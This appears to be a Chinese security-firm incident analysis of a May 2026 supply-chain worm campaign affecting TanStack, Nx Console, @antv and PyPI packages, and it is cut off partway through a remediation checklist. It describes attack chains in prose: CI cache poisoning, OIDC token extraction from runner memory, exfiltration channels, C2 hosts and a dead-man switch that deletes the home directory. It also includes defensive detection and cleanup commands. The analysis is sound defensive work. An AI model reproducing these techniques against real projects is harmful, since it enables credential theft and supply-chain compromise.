---
title: 黑色五月连环劫：GitHub 被黑始末
url: https://mp.weixin.qq.com/s/IYg4fY2XbXb2sD_daE3cqQ
source: Doonsec's feed
date: 2026-05-21
fetch_date: 2026-05-22T05:58:35.985634
---

# 黑色五月连环劫：GitHub 被黑始末

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8z8bibAexaCI7BUMHo5qc1dfRibR2ClT4WThWXTfmCSICib7Dy8oYrMrIrnszcnJPEFzgXCaxyibjNObomkP7DwuDxPA2yAL7MZYibO1KEujL90E/0?wx_fmt=jpeg)

# 黑色五月连环劫：GitHub 被黑始末

原创

慢雾安全团队
慢雾安全团队

慢雾科技

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

********************# 背景

2026 年 5 月开始，知名团伙 TeamPCP 开源了 Shai-Hulud 源码之后，Shai-Hulud/Mini Shai-Hulud 在约一周内完成多条供应链支线的联合攻击，核心逻辑是：先劫持「高信任」发布通道，再收割开发者与 CI 凭据，从而向相邻生态扩散。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCIsTzqzHHu4meBNylhEe6kQ8mK96PibXkrsjBT1ZO11ciaGQbaib5hickLH2AnEAiccB2qNVYuMyYPU0HFGnPiab3eVz5rFJPzxUEwA4/640?wx_fmt=png&from=appmsg)

SlowMist 持续关注事态发展，今日「GitHub 是否因 Nx Console 18.95.0 被黑」进入大家视野，在公开证据下，Nx Console 是高度可疑且正在被联合调查的关键一跳。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCLB0FbOhZD6ib2uOicAYdHsLtWGSbZhh35eoj4ia2fCC1DA7wcakwlGiaZPAiaFgMQzOOQAaG8VUHXYwfHWqAHq6QZQKW3j34aibg4Tg/640?wx_fmt=png&from=appmsg)

关于影响人数：Microsoft Marketplace 向 Nx 反馈的 28 次安装与 Nx 遥测约 6,000 次 VS Code 扩展激活相差约两个数量级 —— 防御与应急应按数千级潜在暴露规划，而非按 28 人处理。

# Shai-Hulud 演化：**********

**********#

![](https://mmbiz.qpic.cn/mmbiz_png/8z8bibAexaCJKPkq2Rfxfl6WFkRFwXictQECEMTuPsZPWIjPxHHHRia8QYYWB6tcU9bXseuianUj8vZETynL3n91DZ1BxicFwKsplFQiaZfJVxKX4/640?wx_fmt=png&from=appmsg)

我们将 TanStack 与多波事件归于 TeamPCP（别名 DeadCatx3、PCPcat、ShellForce、CipherForce）

# 时间轴：**********

**********#

### 2026-05-10 ~ 11：TanStack — 信任 CI，而非偷 npm Token

入口（三链组合，缺一不可）：

1. Pwn Request：攻击者 fork zblgg/configuration，PR #7378 触发 pull\_request\_target 的 bundle-size.yml，在基仓安全上下文中执行 fork 代码。
2. Actions 缓存投毒：向与 release.yml 相同的 pnpm store 缓存键写入约 1.1GB 恶意缓存（pull\_request\_target 与 main 推送共享缓存作用域；permissions: contents: read 无法阻止 cache post-job 写入）。
3. Runner 内存提取 OIDC：release.yml 具备 id-token: write 时，从 Runner.Worker 进程内存读出短期 OIDC 令牌（技术源自 2025-03 tj-actions/changed-files 事件），在 workflow 仍 failure 的情况下完成 84 次 发布（19:20–19:26 UTC）。

恶意包特征：

* 根目录 router\_init.js（约 2.3MB，三层混淆；内部代号 EveryBoiWeBuildIsAWormyBoi）。
* optionalDependencies → github:tanstack/router#79ac49ee... 单独 commit；prepare: bun run tanstack\_runner.js && exit 1（故意失败隐藏日志）。
* Sigstore 验证通过的 SLSA Build Level 3 证明——证明「由 TanStack release workflow 构建」，不证明代码无害。
* 外传：Session P2P（\*.getsession.org）、GitHub GraphQL 死信（伪造 claude@users.noreply.github.com）、注入 codeql\_analysis.yml。
* 持久化：.claude/、.vscode/、gh-token-monitor 死手（先卸 monitor 再轮换 Token，否则可能 rm -rf ~/）。

此次攻击波及：

TanStack Router/Start 相关 42 个 @tanstack/\* 包；蠕虫二次传播至 Mistral、UiPath 等（约 170+ 包记录在案）

未波及：@tanstack/query\*、table\*、form\* 等家族。

### 2026-05-18：Nx Console 18.95.0 — IDE 分发面**********

**********###

#### 官方时间线：**********

**********####

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCKItxPsnlAibXKicJn1805mtT9z4Ao4ufz5Rz1C6TRJWetNfWzFdmibQUibF1F3FFP4BwoPEhbBkJdNqL8YptoD0xW8kwGAUY8aUtE/640?wx_fmt=png&from=appmsg)

####**********

********#### 根本原因（5/21更新）：********

**********####

一名 Nx 开发者遭 TanStack 相关供应链攻击，GitHub CLI (gh) 凭据泄露；攻击者得以在 Nx GitHub 仓库以贡献者身份运行 workflow，并发布恶意扩展。

![](https://mmbiz.qpic.cn/mmbiz_png/8z8bibAexaCICN2CgpZicVmbH0MZBjia1PHCSfvQH3TecMVzgxD3Pm25gq5NNpHO4CH0GOWsNVYgqO1SN4jUNz0EvStNfl4miayjl0rJ8jXhwqc/640?wx_fmt=png&from=appmsg)

####**********

********#### 攻击链路：********

**********####

1. 扩展 activate() 检查 nxConsole.mcpExtensionInstalledSha，若不匹配则后台 Task：npx -y github:nrwl/nx#558b09d7（任务名伪装 install-mcp-extension，focus: false）。
2. 单独 commit 将 monorepo 替换为仅含 package.json + index.js（498KB 混淆） + bun 依赖。
3. 载荷：\_\_DAEMONIZED 守护进程；收割 GitHub / npm / AWS / Vault / K8s / 1Password / Claude Code 配置等。
4. 外传：HTTPS + GitHub API + DNS；含 Sigstore Fulcio/Rekor 逻辑，可伪造下游 npm provenance。
5. 持久化（macOS）：~/.local/share/kitty/cat.py + ~/Library/LaunchAgents/com.user.kitty-monitor.plist；C2 轮询 api.github.com/search/commits?q=firedalazer（RSA-PSS 验签后执行远程 Python）。

此攻击与 5/19 @antv 波次同 TTP：kitty-monitor、firedalazer、Runner /proc/\*/mem 抽 Actions secrets。

### 2026-05-19：同日关联分支 — @antv npm 与 PyPI durabletask**********

**********###

npm：维护者 atool npm 账户被攻陷，发布 547+ 恶意版本，覆盖 @antv 生态； prop 账户也被攻陷并发布 6 个相关包；preinstall: bun run index.js；optionalDependencies: github:antvis/G2#1916faa...；C2 t.m-kosche.com（伪装 OpenTelemetry）；GitHub 死信库描述反转：Shai-Hulud: Here We Go Again。

PyPI：durabletask 1.4.1–1.4.3 被投毒，Linux import-time dropper 最初注入 \_\_init\_\_.py，后续版本扩展到更多模块，下载并执行 rope.pyz / /tmp/managed.pyz。该 payload 是此前 transformers.pyz Python 分支的演化。新能力：AWS SSM SendCommand、Kubernetes kubectl exec 横向传播；主动尝试解锁 Bitwarden / 1Password。

变体：@cap-js/openapi 1.4.1 仅通过 optionalDependencies 指向攻击者 GitHub commit，包 tarball 内无恶意文件。

### 2026-05-19：GitHub 公司内部仓库泄露**********

**********###

* GitHub 披露正在调查未经授权访问内部仓库；TeamPCP 声称约 4,000 私有库。

* 报告称向量：员工工作站上的恶意 VS Code 扩展。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCLfxhmqmBmdEZbJw4WEdhegorUwPwr0A2EbDsNnKhFXfovEOLl2zX0kPsBdhEMwJFFibG4MwQaBhgAwD10AtoN6rhpbbO64DYv0/640?wx_fmt=png&from=appmsg)

* 时间与手法使 Nx Console 18.95.0 成为首要怀疑对象。
* Nx 立场（Jeff Cross）：正与 Microsoft、GitHub 联合调查影响；不推测超出已知事实，亦不淡化严重性。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCJrQIt8OCYhIGJgTOicIQkw5gc7RsibbgwaXPBpc9aXtqjkM4pmibPDVY6J4chuic15f5cA6mwx4Yepic6C2icQMsQiajFJGcrrNwgtnY/640?wx_fmt=png&from=appmsg)

##**********

********## 传播链：********

********##********

********![](https://mmbiz.qpic.cn/sz_mmbiz_png/8z8bibAexaCLepGD9Pcw2dpOKO3T7QvgwSaTZU4KRKaPdzxAKOibUEQVgQlaZXRAtibbVh4oiaKJOT17ZKWbQzqARJj91YKGxhicoaFP9eC7Geh0/640?wx_fmt=png&from=appmsg)

##********

**********## 核心要点：

* GitHub 公司 breach 不是链条起点；起点是 5/11 TanStack CI 信任边界失守。
* Nx Console 是下游放大器（220 万+ 安装、认证发布者、打开即执行）。
* 5/19 @antv/PyPI 与 Nx 属同一 TeamPCP/Mini Shai-Hulud 活动簇，入口为维护者凭据而非 TanStack CI。

## 技术同源指纹：**********

********##********

**********![](https://mmbiz.qpic.cn/mmbiz_png/8z8bibAexaCKuVibicBibMib7NGBibZjHhZXNxcT0XPbUdiaOfnwOWl5HhFdgHWS455QjOzrtC39jItfBD06jyWB6UQpKSQE9kor0tlibiaOhfqib0WKk/640?wx_fmt=png&from=appmsg)

## 为何「官方+证明+认证」集体失效 ?**********

**********##

1. SLSA / Sigstore 证明构建管道身份，不证明 workflow 当时执行的代码可信。
2. pull\_request\_target + Actions Cache 仍是高危组合；需审计 fork 代码与 base 缓存是否隔离。
3. IDE 扩展 = 本地高权限代码；npx -y github:官方仓#单独SHA 极难被传统依赖扫描发现。
4. 开关颠倒 IR：先清除 gh-token-monitor / kitty-monitor 等持久化或监控进程，再吊销和轮换 Token。
5. 分钟级窗口足够：Nx 在架 ~18 分钟；模型针对 自动更新 + 打开工作区，不依赖长期上架。

处置清单：

### 1. 确认暴露**********

********###********

```
# Nx Console 版本code --list-extensions --show-versions | grep angular-console# 18.95.0 = 高危；升级到 >= 18.100.0
# Nx / Shai-Hulud 持久化ls ~/.local/share/kitty/cat.py 2>/dev/nullls ~/Library/LaunchAgents/com.user.kitty-monitor.plist 2>/dev/nullls /var/tmp/.gh_update_state 2>/dev/nullls -d /tmp/kitty-* 2>/dev/nullpkill -f __DAEMONIZEDpkill -f "kitty-"pkill -f "cat.py"
# TanStackfind . -name "router_init.js" -exec shasum -a 256 {} \;# Compromised hash: ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266cfind node_modules/@tanstack -name "package.json" | \  xargs grep -l "voicproducoes\|79ac49eedf"
# @antv 波次（lockfile / package.json）find node_modules -name "index.js" -size +400k -type f 2>/dev/nullgrep -r "1916faa365f2788b6e193514872d51a242876569\|7cb42f57561c321ecb09b4552802ae0ac55b3a7a" \package-lock.json node_modules/ 2>/dev/null
```

**********2. containment（先隔离与清持久化；确认恶意进程停止后再轮换/吊销凭据）**********

```
# macOS kitty-monitorlaunchctl unload ~/Library/LaunchAgents/com.user.kitty-monitor.plist 2>/dev/nullrm -f ~/Library/LaunchAgents/com.user.kitty-monitor.plistrm -f ~/.local/share/kitty/cat.py
# gh-token-monitor（TanStack / @antv）launchctl unload ~/Library/LaunchAgents/com.user.gh-token-monitor.plist 2>/dev/nullsystemctl --user stop gh-token-monitor.service 2>/dev/nullsystemctl --user disable gh-token-monitor.service 2>/dev/nullrm -f ~/.config/systemd/user/gh-token-monitor.servicerm -f ~/.local/bin/gh-token-monitor.sh
# 杀进程pkill -f 'cat\.py' 2>/dev/nullpkill -f __DAEMONIZED# 检查 __DAEMONIZED 环境变量后结束对应进程
```

**********3. 升级与清理

* Nx Console → ≥ 18.100.0
* 移除恶意 @tanstack/\*、@antv/\*、durabletask 恶意版本；从可信元数据重生成 lockfile
* 检查 VS Code globalState 键 nxConsole.mcpExtensionInstalledSha 是否为 558b09d7...
* 删除攻击者注入的 .github/workflows/codeql\_analysis.yml（若并非己方添加）

### 4. 凭据轮换（持久化清除后）*******...